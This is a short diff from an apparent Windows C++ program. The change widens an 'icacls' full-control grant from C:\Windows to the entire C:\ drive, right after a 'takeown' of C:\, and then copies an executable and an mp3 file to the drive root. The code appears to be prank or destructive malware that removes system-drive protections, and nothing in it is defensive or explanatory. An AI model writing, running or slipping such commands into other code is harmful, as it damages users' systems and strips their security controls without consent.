@@ -93,7 +93,7 @@ int main(int argc, char* argv[])
     char char_array[abc.length() + 1]; 
     strcpy(char_array, abc.c_str());
     system((string("takeown /f C:\\")).c_str());
-	system((string("icacls C:\\Windows /grant \""+youser+"\":F")).c_str());
+	system((string("icacls C:\\ /grant \""+youser+"\":F")).c_str());
 	CopyFile("./a.exe","C:/mitze.exe",0);
 	CopyFile("./meow.mp3","C:/meow.mp3",0);
 	for(int i=0;i<abc.length();i++){
